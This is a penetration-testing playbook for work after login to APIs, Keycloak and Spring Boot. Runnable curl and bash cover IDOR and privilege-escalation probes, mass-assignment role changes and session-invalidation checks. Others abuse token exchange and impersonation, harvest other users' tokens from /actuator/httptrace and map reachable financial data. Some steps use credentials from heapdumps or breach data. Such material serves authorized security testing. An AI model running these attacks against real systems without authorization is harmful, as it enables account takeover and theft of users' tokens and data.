# Authenticated Testing Playbook

Structured methodology for testing after obtaining valid credentials — from heapdump extraction, CTI breach data, client-provided accounts, or Keycloak token exchange.

## When to Use

- You obtained credentials from heapdump/CTI/client
- You have a valid JWT/session token
- Client provided test accounts for deeper testing
- You exchanged a service account token for user-level access
- Phase 6 exploitation yielded authenticated access

## First 30 Minutes (Triage)

Immediately after getting authenticated access:

### Step 1: Identify Your Access Level

```bash
# Decode JWT to understand your role
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{
  sub: .sub,
  email: .email,
  preferred_username: .preferred_username,
  realm_access: .realm_access,
  resource_access: .resource_access,
  scope: .scope,
  azp: .azp,
  exp: (.exp | todate)
}'

# Check /me or /userinfo endpoint
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/me" | jq .
curl -sk -H "Authorization: Bearer $TOKEN" "$KEYCLOAK_URL/protocol/openid-connect/userinfo" | jq .
```

### Step 2: Map Accessible Endpoints

```bash
# Try swagger/api-docs WITH auth (may reveal more than unauth)
for path in /v3/api-docs /v2/api-docs /swagger.json /swagger-ui/index.html; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "https://target.com${path}")
  echo "  [${CODE}] ${path}"
done

# Try actuator WITH auth (often reveals more)
for ep in /actuator /actuator/env /actuator/configprops /actuator/mappings /actuator/beans; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "https://target.com${ep}")
  echo "  [${CODE}] ${ep}"
done
```

### Step 3: Identify Other Users/Roles

```bash
# Common user enumeration endpoints
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users" | jq '.[0:5]'
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users?limit=10" | jq '.[] | {id, username, role}'

# Keycloak admin API (if your token has realm-management role)
curl -sk -H "Authorization: Bearer $TOKEN" "https://keycloak.target.com/admin/realms/prod/users?max=10" | jq '.[] | {id, username, email}'
```

### Step 4: Document Baseline

Record what you CAN and CANNOT access. This becomes the reference for privilege escalation testing.

```markdown
## Access Baseline
- **Identity:** user@company.com (role: operator)
- **Realm roles:** [default-roles, offline_access, uma_authorization]
- **Client roles:** [view-profile, manage-account]
- **Accessible services:** bpm, customer, agreement
- **Blocked services:** admin, master, keycloak-admin
- **Token expiry:** 5 minutes (refresh: 30 minutes)
```

---

## Role-Based Access Control (RBAC) Testing

### Horizontal Privilege Escalation (Same Role, Different User)

```bash
# Pattern 1: Sequential ID manipulation
# If your user ID is 1042, try adjacent IDs
for id in 1040 1041 1043 1044 1045; do
  curl -sk -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/v1/users/${id}/profile" -w " [%{http_code}]\n"
done

# Pattern 2: UUID harvesting from list endpoints
# Get other users' UUIDs from accessible endpoints
UUIDS=$(curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://target.com/api/v1/users" | jq -r '.[].id')
for uuid in $UUIDS; do
  curl -sk -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/v1/users/${uuid}/sensitive-data" -w " [%{http_code}]\n"
done

# Pattern 3: Parameter tampering
# Change user_id/account_id/org_id in request body
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://target.com/api/v1/transactions" \
  -d '{"account_id":"OTHER_USERS_ACCOUNT","amount":1}'

# Pattern 4: Bulk endpoint vs individual
# /api/v1/users returns all users but /api/v1/users/{id} should be restricted
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/users" | jq 'length'
```

### Vertical Privilege Escalation (Lower Role → Higher Role)

```bash
# Pattern 1: Try admin endpoints with regular user token
ADMIN_PATHS=("/admin" "/api/admin" "/api/v1/admin/users" "/management" "/api/v1/config" "/api/v1/settings")
for path in "${ADMIN_PATHS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "https://target.com${path}")
  [ "$CODE" != "401" ] && [ "$CODE" != "403" ] && [ "$CODE" != "404" ] && echo "[!] ${path} → ${CODE}"
done

# Pattern 2: Mass assignment on profile update
curl -sk -X PATCH -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://target.com/api/v1/users/me" \
  -d '{"role":"admin","is_admin":true,"permissions":["*"],"group":"administrators"}'

# Pattern 3: HTTP method escalation
# If GET /api/v1/config works, try PUT/POST/DELETE
for method in PUT POST DELETE PATCH; do
  curl -sk -X $method -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    "https://target.com/api/v1/config" \
    -d '{"key":"test","value":"pentest-probe"}' -w " [$method %{http_code}]\n"
done

# Pattern 4: JWT claim manipulation (if signature not verified)
# Modify role in JWT payload — see jwt-attack-techniques.md
```

### Authorization Matrix Testing

```bash
#!/bin/bash
# auth-matrix.sh — Test endpoints across multiple roles
# Usage: ./auth-matrix.sh endpoints.txt

ADMIN_TOKEN="eyJ..."
USER_TOKEN="eyJ..."
MANAGER_TOKEN="eyJ..."

echo "| Endpoint | Method | Admin | Manager | User | Unauth |"
echo "|---|---|---|---|---|---|"

while read -r line; do
  METHOD=$(echo "$line" | cut -d' ' -f1)
  ENDPOINT=$(echo "$line" | cut -d' ' -f2)
  
  ADMIN=$(curl -sk -o /dev/null -w "%{http_code}" -X "$METHOD" -H "Authorization: Bearer $ADMIN_TOKEN" "https://target.com${ENDPOINT}")
  MANAGER=$(curl -sk -o /dev/null -w "%{http_code}" -X "$METHOD" -H "Authorization: Bearer $MANAGER_TOKEN" "https://target.com${ENDPOINT}")
  USER=$(curl -sk -o /dev/null -w "%{http_code}" -X "$METHOD" -H "Authorization: Bearer $USER_TOKEN" "https://target.com${ENDPOINT}")
  UNAUTH=$(curl -sk -o /dev/null -w "%{http_code}" -X "$METHOD" "https://target.com${ENDPOINT}")
  
  echo "| ${ENDPOINT} | ${METHOD} | ${ADMIN} | ${MANAGER} | ${USER} | ${UNAUTH} |"
done < "$1"
```

**Input file format (endpoints.txt):**
```
GET /api/v1/users
POST /api/v1/users
GET /api/v1/users/1
DELETE /api/v1/users/1
GET /api/v1/admin/config
POST /api/v1/transactions
```

**What to look for:**
- User gets 200 where they should get 403 → BFLA finding
- User and Admin get same response → no role differentiation (finding)
- Unauth gets 200 on any endpoint → missing auth (Critical)

---

## Session Management Testing

### Token Lifetime Analysis

```bash
# Check access token lifetime
echo "$ACCESS_TOKEN" | cut -d. -f2 | base64 -d | jq '{
  issued: (.iat | todate),
  expires: (.exp | todate),
  lifetime_minutes: ((.exp - .iat) / 60)
}'

# Findings:
# > 15 minutes for access token → Medium (excessive for financial services)
# > 1 hour → High
# > 24 hours → Critical
```

### Concurrent Session Testing

```bash
# Login from "device A" (get token 1)
TOKEN_A=$(curl -sk -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=password&client_id=app&username=user&password=pass" | jq -r '.access_token')

# Login from "device B" (get token 2)
TOKEN_B=$(curl -sk -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=password&client_id=app&username=user&password=pass" | jq -r '.access_token')

# Test if both tokens still work
curl -sk -H "Authorization: Bearer $TOKEN_A" "https://target.com/api/v1/me" -w " [A: %{http_code}]\n"
curl -sk -H "Authorization: Bearer $TOKEN_B" "https://target.com/api/v1/me" -w " [B: %{http_code}]\n"
# If both work → no concurrent session limit (finding for financial services)
```

### Session Invalidation Tests

```bash
# Test 1: Does token survive password change?
# Get token → change password → test old token
curl -sk -H "Authorization: Bearer $OLD_TOKEN" "https://target.com/api/v1/me" -w " [%{http_code}]\n"
# 200 = token NOT invalidated on password change (High finding)

# Test 2: Does token survive logout?
curl -sk -X POST -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/auth/logout"
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/v1/me" -w " [%{http_code}]\n"
# 200 = token NOT invalidated on logout (Medium finding)

# Test 3: Does refresh token survive password change?
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=refresh_token&refresh_token=$OLD_REFRESH&client_id=app" | jq '.access_token'
# If new access token returned → refresh token NOT revoked (High finding)
```

---

## Keycloak-Specific Authenticated Testing

### Token Scope Analysis

```bash
# What scopes does your token have?
echo "$TOKEN" | cut -d. -f2 | base64 -d | jq '.scope'

# Can you request more scopes?
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=refresh_token&refresh_token=$REFRESH&client_id=app&scope=openid admin realm-management" | jq '.scope'
# If elevated scope returned → scope escalation (High)
```

### Token Exchange

```bash
# Can you exchange your token for a different client's token?
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "subject_token=$TOKEN" \
  -d "client_id=admin-cli" \
  -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
  -d "audience=other-service"
# If token returned → cross-service access (severity depends on target service)
```

### Impersonation

```bash
# If you have realm-admin or impersonation role:
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  "https://keycloak.target.com/admin/realms/prod/users/$VICTIM_USER_ID/impersonation"
# Returns a session that acts as the victim user
```

### Admin REST API Probing

```bash
# Test admin endpoints (even non-admin tokens sometimes work due to misconfiguration)
ADMIN_ENDPOINTS=(
  "/admin/realms"
  "/admin/realms/prod/users?max=5"
  "/admin/realms/prod/clients"
  "/admin/realms/prod/roles"
  "/admin/realms/prod/groups"
  "/admin/realms/prod/events?max=5"
)

for ep in "${ADMIN_ENDPOINTS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" \
    "https://keycloak.target.com${ep}")
  [ "$CODE" = "200" ] && echo "[!] ACCESSIBLE: ${ep}"
done
```

---

## Spring Boot Authenticated Extras

### Actuator with Auth

Authenticated actuator often reveals MORE than unauthenticated:

```bash
# These may return data only with valid auth
AUTH_ACTUATORS=(
  "/actuator/env"           # All environment variables (may include secrets)
  "/actuator/configprops"   # All @ConfigurationProperties values
  "/actuator/mappings"      # All URL mappings (complete API surface)
  "/actuator/beans"         # All Spring beans (architecture map)
  "/actuator/conditions"    # Auto-configuration decisions
  "/actuator/scheduledtasks" # Scheduled jobs (cron, background tasks)
  "/actuator/httptrace"     # Recent HTTP requests (may contain other users' tokens!)
  "/actuator/sessions"      # Active sessions (Spring Session)
)

for ep in "${AUTH_ACTUATORS[@]}"; do
  UNAUTH=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com${ep}")
  AUTH=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "https://target.com${ep}")
  [ "$AUTH" != "$UNAUTH" ] && echo "[!] ${ep}: unauth=${UNAUTH} auth=${AUTH}"
done
```

### /actuator/mappings → Complete API Surface

```bash
# Extract all endpoints from mappings
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/actuator/mappings" | \
  jq -r '.contexts[].mappings.dispatcherServlets[][]?.details?.requestMappingConditions?.patterns[]?' | \
  sort -u > all-endpoints.txt

# This gives you the COMPLETE API surface — better than any brute-force
```

### /actuator/httptrace → Token Harvesting

```bash
# May contain other users' Authorization headers!
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/actuator/httptrace" | \
  jq '.traces[].request.headers.authorization[]?' | sort -u
# If other users' tokens appear → Critical (token leakage via actuator)
```

---

## Data Exfiltration Scope Documentation

Systematically document what authenticated access reveals:

```bash
#!/bin/bash
# data-scope.sh — Document accessible data with auth token
TOKEN="$1"
BASE="https://target.com/api/v1"

echo "=== Data Access Scope ==="

# User data
echo -e "\n--- Users ---"
USERS=$(curl -sk -H "Authorization: Bearer $TOKEN" "$BASE/users" | jq 'length')
echo "  Accessible user records: $USERS"
curl -sk -H "Authorization: Bearer $TOKEN" "$BASE/users?limit=1" | jq '.[0] | keys'

# Financial data
echo -e "\n--- Financial ---"
for ep in /transactions /accounts /balances /credit-scores /loans; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$BASE$ep")
  [ "$CODE" = "200" ] && echo "  [ACCESSIBLE] $ep"
done

# Configuration/business logic
echo -e "\n--- Config ---"
for ep in /config /settings /rules /thresholds /approval-matrix; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$BASE$ep")
  [ "$CODE" = "200" ] && echo "  [ACCESSIBLE] $ep"
done
```

---

## Authenticated Scanning

### Nuclei with Auth

```bash
# Run nuclei with authentication
nuclei -u "https://target.com" \
  -H "Authorization: Bearer $TOKEN" \
  -t ~/nuclei-templates/ \
  -severity critical,high,medium \
  -o nuclei-authenticated.txt

# Specific authenticated templates
nuclei -u "https://target.com" \
  -H "Authorization: Bearer $TOKEN" \
  -t ~/nuclei-templates/exposures/ \
  -t ~/nuclei-templates/vulnerabilities/ \
  -t ~/nuclei-templates/misconfiguration/
```

### Authenticated Directory Brute-Force

```bash
# Many paths return different results with auth
gobuster dir -u "https://target.com" \
  -w $SECLISTS_PATH/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Authorization: Bearer $TOKEN" \
  -s "200,201,204,301,302" \
  -o gobuster-authenticated.txt
```

---

## Quick Wins Checklist (Ordered by ROI)

| # | Test | Time | Expected Finding |
|---|---|---|---|
| 1 | Decode JWT — check roles, permissions, expiry | 2 min | Token lifetime, role mapping |
| 2 | /actuator/env with auth | 2 min | Secret exposure (Critical) |
| 3 | /actuator/mappings with auth | 2 min | Complete API surface map |
| 4 | /swagger-ui or /api-docs with auth | 2 min | Full endpoint documentation |
| 5 | Try admin endpoints with regular token | 5 min | Vertical privilege escalation |
| 6 | IDOR on first 3 data endpoints | 10 min | Horizontal access (High) |
| 7 | Mass assignment on profile update | 5 min | Role escalation (Critical) |
| 8 | Token cross-service (audience validation) | 5 min | Service boundary bypass |
| 9 | Concurrent session test | 3 min | No session limit (Medium) |
| 10 | Logout effectiveness | 2 min | Token not invalidated (Medium) |
| 11 | Token survives password change | 3 min | Session persistence (High) |
| 12 | /actuator/httptrace token harvesting | 2 min | Other users' tokens (Critical) |

---

## Integration with ptest Phases

| Phase | Authenticated Actions |
|---|---|
| Phase 3 (Enumeration) | Re-run with auth: actuator/mappings, swagger, directory brute-force |
| Phase 5 (Vuln Assessment) | Nuclei authenticated scan, RBAC threat model |
| Phase 6 (Exploitation) | IDOR, privilege escalation, mass assignment, session attacks |
| Phase 7 (Post-Exploitation) | Data scope documentation, credential harvesting from authenticated position |

**Trigger:** Enter authenticated testing when ANY of these occur:
- Heapdump yields valid token (Phase 6)
- CTI credentials validated (Phase 6)
- Client provides test account (any phase)
- Service account token obtained (Phase 6/7)
- Public client password grant succeeds (Phase 6)
